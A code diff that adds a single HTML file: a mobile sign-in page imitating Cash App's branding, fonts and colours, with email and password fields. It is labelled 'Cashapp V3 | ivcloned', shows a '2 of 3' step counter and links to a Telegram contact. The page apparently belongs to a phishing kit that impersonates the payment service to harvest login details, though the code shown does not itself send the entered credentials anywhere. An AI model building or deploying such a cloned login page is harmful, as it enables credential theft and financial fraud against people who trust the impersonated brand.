@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Cash App Authentication</title>
+    <style>
+      /* --- FONT SETUP --- */
+      @font-face {
+        font-family: "CashMarketR";
+        font-style: normal;
+        src: url(font/CashMarket-RegularRounded.otf);
+        font-display: swap;
+      }
+
+      :root {
+        /* --- Dark Mode (Default) --- */
+        --bg-color: #1c1c1e;
+        --text-primary: #ffffff;
+        --text-secondary: #8d8d8d;
+
+        /* Input Colors */
+        --input-bg: #474749;
+        --input-placeholder: #a1a1a3;
+        --input-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+        --icon-color: #a1a1a3; /* Matches placeholder */
+
+        /* Button Colors */
+        --btn-color: #00bc06;
+        --btn-text: #ffffff;
+      }
+
+      [data-theme="light"] {
+        /* --- Light Mode Variables --- */
+        --bg-color: #ffffff;
+        --text-primary: #000000;
+        --text-secondary: #6e6e6e;
+        --input-bg: #f2f2f2;
+        --input-placeholder: #a0a0a0;
+        --input-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        --icon-color: #a0a0a0;
+        --btn-color: #00bc06;
+        --btn-text: #ffffff;
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        -webkit-tap-highlight-color: transparent;
+      }
+
+      body {
+        font-family: "CashMarketR", -apple-system, BlinkMacSystemFont,
+          "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        background-color: var(--bg-color);
+        color: var(--text-primary);
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        transition: background-color 0.3s ease, color 0.3s ease;
+      }
+
+      .app-container {
+        width: 100%;
+        max-width: 480px;
+        margin: 0 auto;
+        height: 100%;
+        display: flex;
+        flex-direction: column;
+        padding: 20px 24px;
+        position: relative;
+      }
+
+      /* --- HEADER --- */
+      .header {
+        margin-top: 40px;
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        margin-bottom: 40px;
+      }
+
+      .header-text h1 {
+        font-size: 28px;
+        font-weight: 700;
+        letter-spacing: 0.5px;
+        margin-bottom: 5px;
+      }
+
+      .header-text p {
+        color: var(--text-secondary);
+        font-size: 15px;
+        font-weight: 500;
+      }
+
+      .header-right {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-end;
+        margin-top: 10px;
+      }
+
+      .step-indicator {
+        color: var(--text-primary);
+        font-size: 14px;
+        font-weight: 600;
+      }
+
+      .contact-link {
+        margin-top: 6px;
+        font-size: 12px;
+        font-weight: 600;
+        color: var(--btn-color);
+        text-decoration: none;
+        opacity: 0.9;
+        transition: opacity 0.2s;
+      }
+
+      .contact-link:hover {
+        opacity: 1;
+        text-decoration: underline;
+      }
+
+      /* --- MAIN CONTENT --- */
+      .main-content {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        margin-bottom: 80px;
+      }
+
+      .page-title {
+        text-align: center;
+        font-size: 22px;
+        font-weight: 700;
+        margin-bottom: 25px;
+        transition: opacity 0.3s ease;
+      }
+
+      .input-group {
+        display: flex;
+        flex-direction: column;
+        gap: 15px;
+        margin-bottom: 20px;
+      }
+
+      /* Wrapper for inputs to handle relative positioning of icons */
+      .input-wrapper {
+        position: relative;
+        width: 100%;
+      }
+
+      input[type="text"],
+      input[type="email"],
+      input[type="password"] {
+        width: 100%;
+        background-color: var(--input-bg);
+        border: none;
+        border-radius: 12px;
+        padding: 18px 20px;
+        padding-right: 50px; /* Extra padding for the eye icon */
+        font-size: 16px;
+        color: var(--text-primary);
+        outline: none;
+        font-family: inherit;
+        box-shadow: var(--input-shadow);
+        transition: all 0.3s ease;
+        text-align: left;
+      }
+
+      input::placeholder {
+        color: var(--input-placeholder);
+        font-weight: 500;
+      }
+
+      input:focus {
+        filter: brightness(1.05);
+      }
+
+      /* Toggle Password Icon */
+      .toggle-password {
+        position: absolute;
+        right: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 5px;
+        /* Make it clickable area slightly larger */
+      }
+
+      .toggle-password svg {
+        width: 22px;
+        height: 22px;
+        fill: none;
+        stroke: var(--icon-color);
+        stroke-width: 2;
+        stroke-linecap: round;
+        stroke-linejoin: round;
+        transition: stroke 0.3s ease;
+      }
+
+      .toggle-password:hover svg {
+        stroke: var(--text-primary); /* Brighten on hover */
+      }
+
+      /* Switch Link */
+      .switch-container {
+        text-align: center;
+        margin-top: 10px;
+      }
+      .switch-text {
+        color: var(--text-secondary);
+        font-size: 14px;
+        font-weight: 500;
+      }
+      .switch-action {
+        color: var(--btn-color);
+        font-weight: 600;
+        cursor: pointer;
+        margin-left: 5px;
+        text-decoration: none;
+      }
+
+      /* --- FOOTER / BUTTON --- */
+      .footer {
+        margin-bottom: 30px;
+        width: 100%;
+      }
+
+      .continue-btn {
+        width: 100%;
+        background-color: var(--btn-color);
+        color: var(--btn-text);
+        border: none;
+        border-radius: 50px;
+        padding: 16px;
+        font-size: 17px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        text-align: center;
+      }
+
+      .continue-btn:disabled {
+        cursor: default;
+        background-color: var(--btn-color);
+        opacity: 0.85;
+        color: rgba(255, 255, 255, 0.3);
+      }
+
+      /* --- THEME TOGGLE --- */
+      .theme-toggle {
+        position: absolute;
+        top: 20px;
+        right: 20px;
+        background: none;
+        border: 1px solid var(--text-secondary);
+        color: var(--text-secondary);
+        padding: 5px 10px;
+        border-radius: 15px;
+        font-size: 10px;
+        cursor: pointer;
+        opacity: 0.3;
+        transition: opacity 0.2s;
+        z-index: 10;
+      }
+      .theme-toggle:hover {
+        opacity: 1;
+      }
+    </style>
+  </head>
+  <body>
+    <button class="theme-toggle" onclick="toggleTheme()">Theme</button>
+
+    <div class="app-container">
+      <div class="header">
+        <div class="header-text">
+          <h1>Welcome</h1>
+          <p>Cashapp V3 | ivcloned</p>
+        </div>
+
+        <div class="header-right">
+          <div class="step-indicator">2 of 3</div>
+          <a href="https://t.me/iv_cloned" target="_blank" class="contact-link"
+            >Contact Me</a
+          >
+        </div>
+      </div>
+
+      <div class="main-content">
+        <h2 id="pageTitle" class="page-title">Sign In</h2>
+
+        <div class="input-group">
+          <div class="input-wrapper">
+            <input
+              type="email"
+              id="emailInput"
+              placeholder="Email"
+              autocomplete="off"
+            />
+          </div>
+
+          <div class="input-wrapper">
+            <input
+              type="password"
+              id="passInput"
+              placeholder="Password"
+              autocomplete="off"
+            />
+            <!-- Eye Icon SVG -->
+            <div class="toggle-password" onclick="togglePasswordVisibility()">
+              <svg id="eyeIcon" viewBox="0 0 24 24">
+                <!-- Eye Open (Default for showing pass? No default is hidden usually) -->
+                <!-- We start hidden (password type), so we show the 'Eye' that implies "Click to see" -->
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                <circle cx="12" cy="12" r="3"></circle>
+              </svg>
+            </div>
+          </div>
+        </div>
+
+        <div class="switch-container">
+          <span id="switchText" class="switch-text"
+            >Don't have an account?</span
+          >
+          <span id="switchAction" class="switch-action" onclick="toggleMode()"
+            >Sign Up</span
+          >
+        </div>
+      </div>
+
+      <div class="footer">
+        <button id="continueBtn" class="continue-btn" disabled>Continue</button>
+      </div>
+    </div>
+
+    <script>
+      const emailInput = document.getElementById("emailInput");
+      const passInput = document.getElementById("passInput");
+      const continueBtn = document.getElementById("continueBtn");
+      const pageTitle = document.getElementById("pageTitle");
+      const switchText = document.getElementById("switchText");
+      const switchAction = document.getElementById("switchAction");
+      const eyeIcon = document.getElementById("eyeIcon");
+      const body = document.body;
+
+      let isLoginMode = true;
+
+      // 1. Password Visibility Toggle
+      function togglePasswordVisibility() {
+        const currentType = passInput.getAttribute("type");
+
+        if (currentType === "password") {
+          passInput.setAttribute("type", "text");
+          // Switch icon to "Eye Off" (Slash)
+          eyeIcon.innerHTML = `
+                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M1 1l22 22"></path>
+                    <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"></path>
+                `;
+        } else {
+          passInput.setAttribute("type", "password");
+          // Switch icon back to "Eye"
+          eyeIcon.innerHTML = `
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                `;
+        }
+      }
+
+      // 2. Validation Logic
+      function checkInputs() {
+        const email = emailInput.value.trim();
+        const pass = passInput.value.trim();
+
+        if (email.length > 0 && pass.length > 0) {
+          continueBtn.removeAttribute("disabled");
+          continueBtn.style.color = "#FFFFFF";
+          continueBtn.style.opacity = "1";
+        } else {
+          continueBtn.setAttribute("disabled", "true");
+          continueBtn.style.color = "rgba(255, 255, 255, 0.3)";
+          continueBtn.style.opacity = "0.85";
+        }
+      }
+
+      emailInput.addEventListener("input", checkInputs);
+      passInput.addEventListener("input", checkInputs);
+
+      // 3. Toggle Login/Signup
+      function toggleMode() {
+        pageTitle.style.opacity = "0";
+
+        setTimeout(() => {
+          isLoginMode = !isLoginMode;
+
+          if (isLoginMode) {
+            pageTitle.innerText = "Sign In";
+            switchText.innerText = "Don't have an account?";
+            switchAction.innerText = "Sign Up";
+          } else {
+            pageTitle.innerText = "Create Account";
+            switchText.innerText = "Already have an account?";
+            switchAction.innerText = "Sign In";
+          }
+
+          emailInput.value = "";
+          passInput.value = "";
+          checkInputs();
+
+          // Reset password visibility on switch
+          passInput.setAttribute("type", "password");
+          eyeIcon.innerHTML = `
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                `;
+
+          pageTitle.style.opacity = "1";
+        }, 200);
+      }
+
+      // 4. Theme Logic
+      function toggleTheme() {
+        const currentTheme = body.getAttribute("data-theme");
+        if (currentTheme === "light") {
+          body.removeAttribute("data-theme");
+        } else {
+          body.setAttribute("data-theme", "light");
+        }
+      }
+    </script>
+  </body>
+</html>
